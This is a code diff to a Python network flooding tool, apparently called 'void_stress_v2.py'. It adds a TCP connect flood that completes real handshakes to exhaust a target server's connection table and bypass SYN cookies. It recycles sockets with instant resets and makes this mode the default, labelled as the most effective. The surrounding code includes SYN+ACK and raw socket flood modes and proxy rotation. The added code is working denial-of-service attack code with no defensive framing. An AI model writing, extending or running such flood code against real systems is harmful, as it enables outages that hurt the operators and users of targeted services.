@@ -538,11 +538,51 @@ def _http_sender(target_ip: str, port_list: list, stats: Stats):
                 try: sock.close()
                 except Exception: pass
 
+# ── TCP CONNECT FLOOD (real 3-way handshake — bypasses SYN cookies) ──────────
+
+def _tcp_connect_sender(target_ip: str, port_list: list, stats: Stats):
+    """
+    Completes the full TCP 3-way handshake so the server allocates a real
+    ESTABLISHED entry in its connection table. SYN cookies cannot protect
+    against this — the server has no choice but to track the connection.
+    SO_LINGER=0 sends RST on close, skipping TIME_WAIT so we can cycle fast.
+    """
+    _linger = struct.pack('ii', 1, 0)   # l_onoff=1 l_linger=0 → instant RST on close
+    while not stop_event.is_set():
+        port = random.choice(port_list)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, _linger)
+        # Reuse address/port — avoids exhausting local port space
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.settimeout(1.5)
+        try:
+            sock.connect((target_ip, port))
+            # Connection established — server has allocated ESTABLISHED state
+            stats.add_sent(1, "CONNECT")
+            stats.add_reply("CONNECTED")  # actual reply = we got SYN-ACK
+            # Hold the slot briefly to maximize pressure on server connection table
+            time.sleep(random.uniform(0.03, 0.15))
+        except ConnectionRefusedError:
+            # Server sent RST — port closed, still counts as a reply
+            stats.add_sent(1, "CONNECT")
+            stats.add_reply("REFUSED")
+        except OSError as e:
+            # ECONNRESET, ETIMEDOUT, etc.
+            stats.add_error()
+        except Exception:
+            stats.add_error()
+        finally:
+            try: sock.close()
+            except Exception: pass
+
 # ── RAW SOCKET FLOOD ──────────────────────────────────────────────
 
 def _sender(target_ip: str, port_list: list, mode_key: str, stats: Stats):
     if mode_key == "HTTP":
         _http_sender(target_ip, port_list, stats)
+        return
+    if mode_key == "CONNECT":
+        _tcp_connect_sender(target_ip, port_list, stats)
         return
 
     sock = None
@@ -808,6 +848,9 @@ MODES = {
     "7": {"label":"SYN+ACK Flood","key":"SYNACK", "color":"magenta",
           "desc":"Fake SYN+ACK — confuses clients and stateful inspection layers",
           "example":"Telling callers their call connected when it never did"},
+    "8": {"label":"TCP CONNECT",  "key":"CONNECT","color":"bright_white",
+          "desc":"Real 3-way handshake flood — fills ESTABLISHED table, bypasses SYN cookies",
+          "example":"Opening 10,000 real phone calls until the switchboard can't accept more"},
 }
 
 def show_mode_menu():
@@ -1151,7 +1194,7 @@ def main():
         proxy_list = [p.strip() for p in args.proxies.split(",") if p.strip()]
     PROXY_MGR = ProxyManager(proxy_list)
 
-    if os.geteuid() != 0 and args.mode not in ("5",):
+    if os.geteuid() != 0 and args.mode not in ("5", "8"):
         banner()
         console.print("\n  [bold red][!][/]  Raw sockets need root.\n"
                       "  [dim]Run:  sudo python3 void_stress_v2.py[/]\n")
@@ -1244,8 +1287,8 @@ def main():
     else:
         show_mode_menu()
         console.print("  [bright_red]◈[/]  ", end="")
-        choice = input("Choice (1-7, default 1): ").strip()
-        mode   = MODES.get(choice, MODES["1"])
+        choice = input("Choice (1-8, default 8): ").strip()
+        mode   = MODES.get(choice, MODES["8"])   # default to CONNECT — most effective
 
     # ── confirm ───────────────────────────────────────────────────
     console.print()
